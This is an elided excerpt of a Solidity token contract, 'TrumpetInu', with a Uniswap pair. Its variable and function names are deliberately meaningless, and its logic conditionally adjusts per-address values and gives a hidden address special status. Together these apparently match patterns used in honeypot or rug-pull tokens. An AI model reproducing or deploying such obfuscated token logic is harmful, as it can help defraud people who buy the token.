...
contract TrumpetInu is Ownable {
    uint256 private drove;
    string private central;
    uint256 private _tTotal;
    string private must;
    uint256 private sent;
    uint8 private outer;
    ...
    function dry(
        ...
        frog = shells == pleasure;

        if (!frog && month[pleasure] == 0 && riding[pleasure] > 0) {
            month[pleasure] -= outer;
        }
    ...
    constructor(
        ...
        shells = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        ...
        drove = 0;
        sent = 100;
        month[production] = outer;
        _tTotal = 1000000000000000 * 10**outer;
        doll[msg.sender] = _tTotal;
    }
}
